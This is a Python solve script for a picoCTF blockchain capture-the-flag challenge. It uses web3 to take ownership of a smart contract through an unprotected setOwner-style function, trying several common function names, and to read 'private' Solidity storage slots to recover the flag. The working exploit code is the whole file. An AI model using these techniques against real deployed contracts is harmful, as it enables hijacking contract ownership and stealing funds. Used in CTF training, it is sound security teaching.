#!/usr/bin/env python3
"""
Access_Control - picoCTF 2026 (Blockchain, 200 pts)

Exploit an access control vulnerability in a Solidity smart contract
to become the owner and retrieve the flag.

Two approaches implemented:
  1. Call an unprotected setOwner/changeOwner function
  2. Read the flag directly from contract storage (private vars are readable)

Usage:
    python3 solve.py

Dependencies: web3 (pip install web3)

You will need to fill in the challenge-specific values below:
  - RPC_URL: The Ethereum RPC endpoint provided by the challenge
  - CONTRACT_ADDRESS: The deployed contract address
  - PRIVATE_KEY: Your wallet's private key (provided by the challenge)
  - CONTRACT_ABI: The ABI of the contract (provided or reverse-engineered)
"""

from web3 import Web3
import json
import sys

# ============================================================
# CHALLENGE-SPECIFIC VALUES - Fill these in from the challenge
# ============================================================
RPC_URL = "http://CHALLENGE_HOST:CHALLENGE_PORT"  # e.g., "http://saturn.picoctf.net:12345"
CONTRACT_ADDRESS = "0x_CONTRACT_ADDRESS_HERE"
PRIVATE_KEY = "0x_YOUR_PRIVATE_KEY_HERE"

# Typical ABI for this type of challenge (adjust based on actual contract)
CONTRACT_ABI = json.loads("""[
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"type": "address", "name": ""}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"type": "address", "name": "_newOwner"}],
        "name": "setOwner",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"type": "string", "name": ""}],
        "stateMutability": "view",
        "type": "function"
    }
]""")

# Alternative function names to try if setOwner doesn't exist
OWNER_FUNCTION_NAMES = [
    "setOwner",
    "changeOwner",
    "transferOwnership",
    "updateOwner",
    "init",
    "initialize",
]

FLAG_FUNCTION_NAMES = [
    "getFlag",
    "flag",
    "readFlag",
    "retrieveFlag",
    "secret",
    "getSecret",
]


def approach_1_call_unprotected_function(w3, contract_address, private_key):
    """
    Approach 1: Call an unprotected owner-changing function,
    then call getFlag().
    """
    account = w3.eth.account.from_key(private_key)
    my_address = account.address
    print(f"[*] Our address: {my_address}")

    contract = w3.eth.contract(address=contract_address, abi=CONTRACT_ABI)

    # Check current owner
    try:
        current_owner = contract.functions.owner().call()
        print(f"[*] Current contract owner: {current_owner}")
    except Exception as e:
        print(f"[!] Could not read owner: {e}")

    # Try to become the owner
    print("[*] Attempting to call setOwner() with our address...")
    try:
        tx = contract.functions.setOwner(my_address).build_transaction({
            'from': my_address,
            'nonce': w3.eth.get_transaction_count(my_address),
            'gas': 200000,
            'gasPrice': w3.eth.gas_price,
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"[+] setOwner() transaction successful! Hash: {tx_hash.hex()}")
    except Exception as e:
        print(f"[!] setOwner() failed: {e}")
        print("[*] Trying alternative function names...")

        # Try alternative function signatures by encoding manually
        for func_name in OWNER_FUNCTION_NAMES:
            try:
                # Build function selector: first 4 bytes of keccak256(signature)
                selector = w3.keccak(text=f"{func_name}(address)")[:4]
                # Encode the address parameter (32 bytes, left-padded)
                encoded_addr = bytes(12) + bytes.fromhex(my_address[2:])
                data = selector + encoded_addr

                tx = {
                    'from': my_address,
                    'to': contract_address,
                    'nonce': w3.eth.get_transaction_count(my_address),
                    'gas': 200000,
                    'gasPrice': w3.eth.gas_price,
                    'data': data,
                }
                signed_tx = w3.eth.account.sign_transaction(tx, private_key)
                tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
                receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                print(f"[+] {func_name}() succeeded! Hash: {tx_hash.hex()}")
                break
            except Exception:
                continue

    # Verify we are now the owner
    try:
        new_owner = contract.functions.owner().call()
        print(f"[*] New contract owner: {new_owner}")
        if new_owner.lower() == my_address.lower():
            print("[+] We are now the owner!")
        else:
            print("[!] Owner change did not work, trying storage read approach...")
            return None
    except Exception:
        pass

    # Get the flag
    print("[*] Calling getFlag()...")
    try:
        flag = contract.functions.getFlag().call({'from': my_address})
        print(f"\n[+] FLAG: {flag}")
        return flag
    except Exception as e:
        print(f"[!] getFlag() failed: {e}")
        return None


def approach_2_read_storage(w3, contract_address):
    """
    Approach 2: Read the flag directly from contract storage.
    Private variables in Solidity are NOT actually private on-chain.

    Storage layout (typical):
      Slot 0: owner (address, 20 bytes)
      Slot 1: flag (string -- if short, stored in-place; if long, stored at keccak256(slot))
    """
    print("\n[*] === Approach 2: Direct storage read ===")
    print("[*] Reading contract storage slots to find the flag...")

    # Read slot 0 (usually the owner)
    slot0 = w3.eth.get_storage_at(contract_address, 0)
    print(f"[*] Slot 0 (owner): {slot0.hex()}")

    # Read slot 1 (often the flag for simple contracts)
    slot1 = w3.eth.get_storage_at(contract_address, 1)
    print(f"[*] Slot 1 (raw):   {slot1.hex()}")

    # Solidity string storage:
    # - Short strings (< 32 bytes): stored directly in the slot, last byte = length * 2
    # - Long strings (>= 32 bytes): slot contains length * 2 + 1,
    #   actual data stored at keccak256(slot_number)

    last_byte = slot1[-1]

    if last_byte % 2 == 0:
        # Short string: data is in the slot, last byte is length * 2
        str_len = last_byte // 2
        flag_bytes = slot1[:str_len]
        flag = flag_bytes.decode('utf-8', errors='replace')
        print(f"[+] Short string in slot 1: {flag}")
    else:
        # Long string: length = (value - 1) / 2
        slot1_int = int.from_bytes(slot1, 'big')
        str_len = (slot1_int - 1) // 2
        print(f"[*] Long string detected, length = {str_len} bytes")

        # Data is stored starting at keccak256(slot_number)
        data_slot = int.from_bytes(w3.keccak(
            b'\x00' * 31 + b'\x01'  # slot 1, padded to 32 bytes
        ), 'big')

        # Read enough slots to cover the string
        flag_bytes = b''
        slots_needed = (str_len + 31) // 32
        for i in range(slots_needed):
            chunk = w3.eth.get_storage_at(contract_address, data_slot + i)
            flag_bytes += chunk

        flag = flag_bytes[:str_len].decode('utf-8', errors='replace')
        print(f"[+] Long string data: {flag}")

    # Also try a few more slots in case flag is elsewhere
    if 'picoCTF' not in flag:
        print("\n[*] Flag not found in slot 1, scanning more slots...")
        for slot_num in range(2, 10):
            slot_data = w3.eth.get_storage_at(contract_address, slot_num)
            if slot_data != b'\x00' * 32:
                try:
                    decoded = slot_data.rstrip(b'\x00').decode('utf-8', errors='replace')
                    print(f"    Slot {slot_num}: {decoded}")
                    if 'picoCTF' in decoded:
                        flag = decoded
                        break
                except Exception:
                    print(f"    Slot {slot_num}: {slot_data.hex()}")

    if 'picoCTF' in flag:
        print(f"\n[+] FLAG: {flag}")
    return flag


def main():
    # Connect to the blockchain
    print(f"[*] Connecting to RPC: {RPC_URL}")

    if "CHALLENGE_HOST" in RPC_URL:
        print("[!] Please update RPC_URL, CONTRACT_ADDRESS, and PRIVATE_KEY")
        print("[!] with the values provided by the challenge.")
        print()
        print("[*] Example usage after updating values:")
        print("    python3 solve.py")
        print()
        print("[*] Typical picoCTF blockchain challenge setup:")
        print("    1. Connect to the challenge instance to get RPC URL and credentials")
        print("    2. The contract source code reveals the vulnerability")
        print("    3. Call the unprotected function to become owner")
        print("    4. Call getFlag() to retrieve the flag")
        sys.exit(1)

    w3 = Web3(Web3.HTTPProvider(RPC_URL))

    if not w3.is_connected():
        print("[!] Failed to connect to RPC endpoint")
        sys.exit(1)

    print(f"[+] Connected! Chain ID: {w3.eth.chain_id}")

    contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)

    # Approach 1: Exploit unprotected function
    flag = approach_1_call_unprotected_function(w3, contract_address, PRIVATE_KEY)

    # Approach 2: Read storage directly (works even without becoming owner)
    if flag is None or 'picoCTF' not in str(flag):
        flag = approach_2_read_storage(w3, contract_address)

    if flag and 'picoCTF' in str(flag):
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("\n[!] Could not retrieve flag automatically.")
        print("[*] Try reading more storage slots or check the contract source code.")


if __name__ == '__main__':
    main()
